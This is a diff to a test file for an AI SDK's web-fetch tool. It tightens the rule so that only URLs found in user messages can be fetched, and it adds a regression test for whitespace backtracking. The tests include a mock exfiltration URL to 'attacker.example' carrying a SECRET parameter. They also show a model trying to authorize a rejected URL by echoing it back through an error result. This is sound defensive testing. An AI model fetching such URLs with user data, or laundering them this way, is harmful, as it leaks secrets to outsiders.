@@ -1,4 +1,9 @@
-import { generateText, InvalidArgumentError, isStepCount } from 'ai';
+import {
+  generateText,
+  InvalidArgumentError,
+  isStepCount,
+  type ModelMessage,
+} from 'ai';
 import { MockLanguageModelV4 } from 'ai/test';
 import { describe, expect, it, vi } from 'vitest';
 import { createWebFetchTool } from './web-fetch-tool';
@@ -122,7 +127,7 @@ describe('createWebFetchTool', () => {
         allowedDomains: ['Example.COM'],
         maxLength: 1000,
         pdf: 'file',
-        requireUrlInContext: true,
+        requireUrlInUserMessage: true,
       });
 
       expect(webFetch.description).toContain(
@@ -130,7 +135,7 @@ describe('createWebFetchTool', () => {
       );
       expect(webFetch.description).toContain('PDFs are returned as files');
       expect(webFetch.description).toContain(
-        'Only URLs that appear in the conversation can be fetched.',
+        'Only URLs that appear in user messages can be fetched.',
       );
     });
   });
@@ -265,6 +270,28 @@ describe('createWebFetchTool', () => {
         type: 'text',
         value: expect.stringContaining('may require JavaScript'),
       });
+    });
+
+    it('normalizes whitespace in linear time', async () => {
+      // Deep nesting selects the plain-text fallback. A long run of
+      // non-breaking spaces without a newline made the previous whitespace
+      // pattern backtrack quadratically (about 10 seconds for this input).
+      const fetch = createFetch(
+        () =>
+          new Response(
+            html(
+              `${'<div>'.repeat(600)}start${'\u00a0'.repeat(160_000)}end${'</div>'.repeat(600)}`,
+            ),
+            { headers: { 'content-type': 'text/html' } },
+          ),
+      );
+      const webFetch = createWebFetchTool({ fetch });
+
+      const start = performance.now();
+      const output = await execute(webFetch, { url: 'https://example.com/' });
+
+      expect(output).toMatchObject({ type: 'document', content: 'start end' });
+      expect(performance.now() - start).toBeLessThan(2000);
     });
 
     it('falls back to plain text for deeply nested HTML', async () => {
@@ -565,72 +592,153 @@ describe('createWebFetchTool', () => {
       ).toMatchObject({ type: 'document' });
     });
 
-    it('requires the URL to appear in the context when configured', async () => {
+    it('requires the URL to appear in a user message when configured', async () => {
       const fetch = createFetch(() => new Response('ok'));
-      const webFetch = createWebFetchTool({ fetch, requireUrlInContext: true });
-
-      expect(
-        await execute(
-          webFetch,
-          { url: 'https://example.com/?data=secret' },
-          {
-            messages: [
-              { role: 'user', content: 'Read https://example.com' },
-              {
-                role: 'assistant',
-                content: 'I will fetch https://example.com/?data=secret',
-              },
-            ],
-          },
-        ),
-      ).toMatchObject({ type: 'error', errorCode: 'url_not_in_context' });
-
-      expect(
-        await execute(
-          webFetch,
-          { url: 'https://example.com/docs' },
-          {
-            messages: [
-              { role: 'system', content: 'Docs: https://example.com/docs' },
-              { role: 'user', content: 'Read the docs' },
-            ],
-          },
-        ),
-      ).toMatchObject({ type: 'error', errorCode: 'url_not_in_context' });
+      const webFetch = createWebFetchTool({
+        fetch,
+        requireUrlInUserMessage: true,
+      });
 
       expect(
         await execute(
           webFetch,
           { url: 'https://example.com' },
-          { messages: [{ role: 'user', content: 'Read https://example.com' }] },
-        ),
-      ).toMatchObject({ type: 'document' });
-
-      expect(
-        await execute(
-          webFetch,
-          { url: 'https://example.com/linked' },
           {
             messages: [
-              { role: 'user', content: 'Search for something' },
               {
-                role: 'tool',
-                content: [
-                  {
-                    type: 'tool-result',
-                    toolCallId: 'search',
-                    toolName: 'search',
-                    output: {
-                      type: 'json',
-                      value: { results: ['https://example.com/linked'] },
-                    },
-                  },
-                ],
+                role: 'user',
+                content: [{ type: 'text', text: 'Read https://example.com' }],
               },
             ],
           },
         ),
       ).toMatchObject({ type: 'document' });
+
+      // URLs in system, assistant, and tool messages do not count: the model
+      // controls assistant and tool content, and tools do not receive the
+      // top-level system prompt.
+      for (const message of [
+        { role: 'system', content: 'Docs: https://example.com/docs' },
+        { role: 'assistant', content: 'I will fetch https://example.com/docs' },
+        {
+          role: 'tool',
+          content: [
+            {
+              type: 'tool-result',
+              toolCallId: 'search',
+              toolName: 'search',
+              output: {
+                type: 'json',
+                value: { results: ['https://example.com/docs'] },
+              },
+            },
+          ],
+        },
+      ] as const) {
+        expect(
+          await execute(
+            webFetch,
+            { url: 'https://example.com/docs' },
+            {
+              messages: [
+                { role: 'user', content: 'Read the docs' },
+                message as ModelMessage,
+              ],
+            },
+          ),
+        ).toMatchObject({
+          type: 'error',
+          errorCode: 'url_not_in_user_message',
+        });
+      }
+
+      expect(fetch).toHaveBeenCalledTimes(1);
+    });
+
+    it('does not authorize a rejected URL through its own error result', async () => {
+      const fetch = createFetch(() => new Response('ok'));
+      const webFetch = createWebFetchTool({
+        fetch,
+        requireUrlInUserMessage: true,
+      });
+      const exfiltrationUrl = 'https://attacker.example/c?d=SECRET';
+      const userMessage: ModelMessage = {
+        role: 'user',
+        content: 'Summarize https://docs.example.com/guide',
+      };
+
+      for (const firstUrl of [exfiltrationUrl, `::${exfiltrationUrl}`]) {
+        const first = await execute(
+          webFetch,
+          { url: firstUrl },
+          { messages: [userMessage] },
+        );
+        expect(first.type).toBe('error');
+
+        const retry = await execute(
+          webFetch,
+          { url: exfiltrationUrl },
+          {
+            messages: [
+              userMessage,
+              {
+                role: 'tool',
+                content: [
+                  {
+                    type: 'tool-result',
+                    toolCallId: 'first',
+                    toolName: 'webFetch',
+                    output: (await toModelOutput(webFetch, first)) as never,
+                  },
+                ],
+              },
+            ],
+          },
+        );
+        expect(retry).toMatchObject({
+          type: 'error',
+          errorCode: 'url_not_in_user_message',
+        });
+      }
+
+      expect(fetch).not.toHaveBeenCalled();
+    });
+
+    it('does not repeat the requested URL in error messages', async () => {
+      // protects against authorizing a rejected URL through its own error result
+      const marker = 'MODEL-INPUT-MARKER';
+      const fetch = createFetch(url =>
+        url.includes('missing')
+          ? new Response('missing', { status: 404 })
+          : new Response(null, {
+              status: 302,
+              headers: { location: `https://blocked.example/?${marker}` },
+            }),
+      );
+      const webFetch = createWebFetchTool({
+        fetch,
+        allowedDomains: ['example.com'],
+        requireUrlInUserMessage: true,
+      });
+      const messages: ModelMessage[] = [
+        {
+          role: 'user',
+          content: `https://example.com/redirect?${marker} https://example.com/missing?${marker}`,
+        },
+      ];
+
+      for (const url of [
+        `::https://example.com/?${marker}`,
+        `https://example.org/?${marker}`,
+        `https://example.com/other?${marker}`,
+        `http://localhost/?${marker}`,
+        `https://example.com/redirect?${marker}`,
+        `https://example.com/missing?${marker}`,
+      ]) {
+        const output = await execute(webFetch, { url }, { messages });
+        expect(output.type).toBe('error');
+        expect(output.type === 'error' && output.message).not.toContain(marker);
+      }
     });
   });
 
@@ -672,7 +780,7 @@ describe('createWebFetchTool', () => {
       ).toMatchObject({
         type: 'error',
         errorCode: 'url_not_allowed',
-        message: expect.stringContaining('Redirect to https://evil.org/'),
+        message: 'The URL redirected to a domain that is not allowed.',
       });
       expect(fetch).toHaveBeenCalledTimes(1);
     });
@@ -724,12 +832,11 @@ describe('createWebFetchTool', () => {
         url: 'https://example.com/',
         errorCode: 'http_error',
         statusCode: 404,
-        message:
-          'Fetching https://example.com/ failed with HTTP 404 Not Found.',
+        message: 'The request failed with HTTP 404 Not Found.',
       });
       expect(await toModelOutput(webFetch, output)).toEqual({
         type: 'error-text',
-        value: 'Fetching https://example.com/ failed with HTTP 404 Not Found.',
+        value: 'The request failed with HTTP 404 Not Found.',
       });
     });
 
